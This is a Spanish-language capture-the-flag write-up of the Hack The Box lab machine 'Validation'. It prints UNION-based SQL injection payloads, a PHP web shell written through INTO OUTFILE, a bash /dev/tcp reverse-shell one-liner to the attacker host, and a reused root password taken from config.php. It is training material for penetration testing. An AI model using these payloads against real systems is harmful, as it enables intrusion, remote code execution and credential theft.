---
layout: post
title: HTB Validation
date: '2024-01-09 11:46:36 -0500'
categories: [HTB, Easy]
tags: [Web, SQLI, SQL, RCE, PHP, Linux,  HardcodeCreds] 
image:
  path: /validation/preview.png
  alt: Validation
---

## Resumen
![logo](/validation/logo.png){: .right w="200" h="200" }
**Validation** es una máquina excelente para practicar habilidades en pentesting web. Al iniciar, se observa la presencia de una web, y al probar vulnerabilidades, se descubre que es vulnerable a una inyección SQL. Sin embargo, después de varios intentos, se logra volcar toda la base de datos sin encontrar información interesante. Es necesario buscar un nuevo vector.

La enumeración de múltiples datos, como la versión, el usuario que ejecuta la base de datos y los privilegios asociados, revela que el sistema cuenta con la capacidad de leer archivos dentro del servidor, y posiblemente también de escribirlos. En caso de que sea así, se podría montar una web shell si se conoce la ruta absoluta de la web. Al confirmar esta posibilidad, se procede a ejecutar una RCE (ejecución remota de código), logrando así obtener una shell dentro de la máquina.

Para concluir, se descubre un archivo de configuración en el host que contiene las credenciales del usuario **root**.


## Reconocimiento

Para comenzar, se realiza un **ping** para verificar la conectividad con la máquina.

```bash
ping 10.10.11.116  -c 1
PING 10.10.11.116 (10.10.11.116) 56(84) bytes of data.
64 bytes from 10.10.11.116: icmp_seq=1 ttl=63 time=246 ms

--- 10.10.11.116 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 246.405/246.405/246.405/0.000 ms
```
{: .nolineno}

### Escaneo de Puertos

Ahora que se ha confirmado la conectividad, se procede a revisar con ayuda de `nmap` qué puertos se encuentran abiertos con el siguiente comando:


```bash
nmap -p- --min-rate 3000 10.10.11.116  -Pn   -oG ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-09 13:33 EST
Nmap scan report for 10.10.11.116
Host is up (0.17s latency).
Not shown: 65522 closed tcp ports (conn-refused)
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
4566/tcp open     kwtc
5000/tcp filtered upnp
5001/tcp filtered commplex-link
5002/tcp filtered rfe
5003/tcp filtered filemaker
5004/tcp filtered avt-profile-1
5005/tcp filtered avt-profile-2
5006/tcp filtered wsm-server
5007/tcp filtered wsm-server-ssl
5008/tcp filtered synapsis-edge
8080/tcp open     http-proxy
```
{: .nolineno}


Después de obtener información sobre los puertos abiertos, se desea realizar un escaneo más profundo para identificar las tecnologías y versiones que la web está utilizando. Esto se puede realizar con el siguiente comando:

```bash
nmap -p22,80,4566,8080 --min-rate 3000 -sVC -Pn -oN version 10.10.11.116

Nmap scan report for 10.10.11.116 (10.10.11.116)
Host is up (0.22s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
80/tcp   open  http    Apache httpd 2.4.48 ((Debian))
|_http-server-header: Apache/2.4.48 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
4566/tcp open  http    nginx
|_http-title: 403 Forbidden
8080/tcp open  http    nginx
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{: .nolineno}
## Enumeración

Dado que hay una página web, se intenta identificar las tecnologías que utiliza con la ayuda de la herramienta **whatweb**:

```bash
whatweb http://10.10.11.116/

http://10.10.11.116/ [200 OK] Apache[2.4.48], Bootstrap, Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.48 (Debian)], IP[10.10.11.116], JQuery, PHP[7.4.23], Script, X-Powered-By[PHP/7.4.23]
```
{: .nolineno}


Al acceder a la web, se observa un panel en el cual se debe ingresar un usuario y seleccionar un país.

![web](/validation/web.png)


El uso de la página web consiste simplemente en ingresar los datos mencionados anteriormente y hacer clic en el botón correspondiente. Esto llevará a un nuevo panel donde se reflejará la información ingresada.


![uso](/validation/uso.png)


![view](/validation/view.png)


Se realiza un intento de capturar la petición utilizando **Burp Suite** y se añade una comilla simple (`'`) con el fin de descubrir si la aplicación es vulnerable a alguna forma de inyección. Por lo que se prueba dentro de campo del nombre de usuario pero no parece suceder nada interesante.

![testuser](/validation/testuser.png)

Adicionalmente, se realiza la prueba de ingresar una comilla en el campo del atacante, y se observa que la web arroja un error, indicando la posibilidad de ser vulnerable a una inyección SQL.

![country](/validation/country.png)



![error](/validation/error.png)

## Explotación


Ahora se busca descubrir cuántas columnas hay dentro de la tabla que se está mostrando.

```bash
'order by 2-- -
```
{: .nolineno}

Dado que se obtiene un error, se infiere que el número de columnas en la tabla es menor al que se está indicando.


![orderby2](/validation/orderby2.png)


Se realiza una prueba con una columna y se verifica que no se produce ningún error, lo que sugiere que solo se cuenta con una columna en la tabla.


```bash
'order by 1-- -
```

![orderby1](/validation/orderby1.png)

Tras descubrir que solo hay una columna, se procede a realizar una consulta de unión SELECT para determinar si es posible controlar la información que se refleja en la web mediante consultas.

```bash
'union select "pan"-- -
```
{: .nolineno}



![unionselect](/validation/unionselect.png)



Ahora se ejecuta una consulta para identificar qué bases de datos se encuentran dentro del sistema.


```bash
'union select schema_name from information_schema.schemata-- -
```
{: .nolineno}

La única base de datos llamativa parece ser la denominada "registration".

![dbs](/validation/dbs.png)

Ahora se procede a identificar qué tablas contiene la base de datos.

```bash
'union select table_name from information_schema.tables where table_schema='registration'-- -
```
{: .nolineno}

Se observa que solo existe una única tabla, la cual también lleva por nombre "registration".

![tables](/validation/tables.png)


Ahora se desea revisar qué columnas se encuentran dentro de la tabla.

```bash
'union select column_name from information_schema.columns where table_schema='registration' and table_name='registration'-- - 
```
{: .nolineno}

Las columnas identificadas son las siguientes:

![columns](/validation/columns.png)

Ahora se procede a revisar la información de cada columna, empezando por la columna "username".

```bash
' union select username from registration.registration-- -
```
{: .nolineno}

Sin embargo, en esta columna solo se visualiza el nombre del usuario que hemos creado.


![username](/validation/username.png)

A continuación, se examina el contenido de la columna "userhash".


```bash
'union select  userhash from registration.registration -- -
```
{: .nolineno}


En el contenido de esta columna se puede identificar el mismo valor que viajaba en la cookie al realizar la petición con el usuario "madlies", sugiriendo que se trata de un identificador para ese usuario.


![hash](/validation/hash.png)

Dado que las otras dos columnas no parecen tener nombres llamativos, se inicia el proceso de obtener información de la base de datos, como como la verisión de  la misma.

```bash
' union select @@version-- -
```
{: .nolineno}


![version](/validation/version.png)

Se puede revisar quien se encuentra corrinedo la base de datos.

```bash
'union select user()-- -
```
{: .nolineno}

Se verifica que la base de datos está siendo ejecutada por el usuario **uhc**.


![user](/validation/user.png)



Con esta información, se procede a revisar los privilegios con los que cuenta el usuario **uhc** dentro de la base de datos.

```bash
' UNION SELECT  privilege_type FROM information_schema.user_privileges WHERE grantee="'uhc'@'localhost'"-- -
```
{: .nolineno}


![privs](/validation/privs.png)


Gracias a esta revisión, se constata que el usuario cuenta con el permiso **file**, que le permite leer archivos dentro del equipo. Por lo tanto, se plantea la posibilidad de intentar leer algún archivo de interés, como por ejemplo, `/etc/passwd`.



```bash
' UNION SELECT LOAD_FILE('/etc/passwd')-- -
```
{: .nolineno}


![etcpasswd](/validation/etcpasswd.png)


Ahora se intenta escribir un archivo que interprete código PHP, en una posible ruta donde se encuentra almacenada la web, como por ejemplo, `/var/www/html`. Si esto se realiza de manera exitosa, se registra un archivo que nos permite obtener una ejecución remota de código (RCE) sobre el equipo. Por lo que se puede hacer la prueba con un archivo **txt**.


```bash
'union select  'this is a test' INTO OUTFILE '/var/www/html/test.txt'-- -
```
{: .nolineno}

Aunque la web arroje un error, es debido a que la respuesta de este comando no produce salida, por lo que la web no tiene información para mostrar y genera un error. No obstante, es necesario verificar en la ruta si nuestro archivo de prueba fue cargado correctamente.


![fail](/validation/fail.png)

![test](/validation/test.png)

Dado que se confirmó que la carga del archivo fue exitosa, se procede a subir un archivo que interprete comandos en PHP, lo que permitirá obtener una shell reversa.


```bash
' union select '<?php system($_REQUEST[0]); ?>' into outfile '/var/www/html/shell.php'-- -
```
{: .nolineno}

Al revisar, se observa que el archivo está arrojando un error, indicando que se ha subido correctamente. Sin embargo, se entiende que es necesario agregarle el parámetro esperado para su funcionamiento adecuado.


![webshell](/validation/webshell.png)

Se lleva a cabo una prueba rápida para verificar si es posible ejecutar de forma remota algún comando de prueba, como por ejemplo `ls`.

![rce](/validation/rce.png)


Ahora solo falta ponerse a la escucha con ayuda de `nc`.

```bash
nc -lvp 1234
listening on [any] 1234 ...
```
{: .nolineno}


Ahora se envía el comando para establecer la shell reversa.

```bash
bash -c 'exec bash -i %26>/dev/tcp/10.10.14.14/1234 <%261'
```
{: nolineno}


Y se gana la misma dentro de la máquina atacante.


```bash
nc -lvp 1234
listening on [any] 1234 ...
10.10.11.116: inverse host lookup failed: Host name lookup failure
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.116] 58120
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@validation:/var/www/html$ 
```
{: .nolineno}


## Escadalada de Privilegios

Al ingresar al equipo, se nota la presencia de un archivo llamado **config.php**. Dada su posible importancia, se procede a revisarlo y efectivamente se encuentra que contiene una credencial para el servicio de la base de datos.


```bash
cat config.php
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```
{: .nolineno}

Dado que existe la posibilidad de que la credencial se reutilice, se realiza la prueba de utilizarla como **root**, lo que permite acceder al usuario con máximos privilegios.

```bash
su root
Password: uhc-9qual-global-pw
whoami
root
```
{: .nolineno}




